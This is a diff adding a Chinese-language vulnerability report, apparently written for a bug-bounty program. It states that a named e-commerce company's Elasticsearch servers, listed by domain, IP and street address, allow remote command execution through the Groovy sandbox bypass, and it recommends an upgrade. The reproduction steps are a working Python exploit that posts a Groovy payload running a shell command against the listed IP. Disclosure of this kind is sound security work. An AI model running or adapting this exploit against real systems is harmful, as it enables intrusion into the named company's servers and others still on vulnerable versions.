@@ -1,0 +1,42 @@
+厂商名称：广东金秋电子商务有限公司
+所属SRC：互联网空间-亿万守护计划
+漏洞标题：xxx网站存在命令执行
+漏洞类别：web
+漏洞类型: 事件型
+利用通用漏洞：是
+组件名称：Elasticsearch_before1.3.8_execcode<1.3.8
+漏洞等级：严重
+漏洞url：http://vip.jinqiuds.com:8090 http://jinqiuds.com:8090 http://m.shengqianzhan.net:8090 http://www.jinqiuds.com:8090
+网站名称：广东金秋电子商务有限公司
+网站ip：123.207.23.211
+所属地区：梅州市梅江区丽都西路12号
+漏洞描述：1.3.8 之前的 Elasticsearch_before1.3.8_execcode 和 1.4.3 之前的 1.4.x 中的 Groovy 脚本引擎允许远程攻击者绕过沙箱保护机制并通过精心设计的脚本执行任意 shell 命令。
+公司业务：网上销售产品、软件开发与设计、网络工程、企业信息化管理、网站设计与开发、网页制作、通信系统开发集成、电子商务、自动化控制系统开发与集成、技术咨询服务与培训；网上销售食品、化妆品、日用百货、家用电器、服装鞋帽、文体用品、户外活动用品；电子产品销售，钟表与计时仪器销售。(依法须经批准的项目，经相关部门批准后方可开展经营活动)
+复现步骤：
+# -*- coding: UTF-8 -*-
+import requests
+
+host = 'http://123.207.23.211:8090'
+if host[-1] == '/':
+    host = host[:-1]
+
+def poc(target_url):
+    check_url = target_url + '/_search?pretty'
+    headers = {'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+               'Content-Type': 'application/text'
+               }
+    data = """{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}"""
+    try:
+        response = requests.post(data=data, url=check_url, headers=headers, verify=False, timeout=5)
+        if response.status_code == 200 and 'uid=0' in response.text and 'gid' in response.text:
+            # set info['LEVEL']:str and info['vulnable']:int as the return
+            print('严重')
+        elif response.status_code == 200 and 'uid' in response.text and 'gid' in response.text:
+            # set info['LEVEL']:str and info['vulnable']:int as the return
+            print('高危')
+    except:
+        print('error')
+
+poc(host)
+        
+修复方案：升级Elasticsearch版本
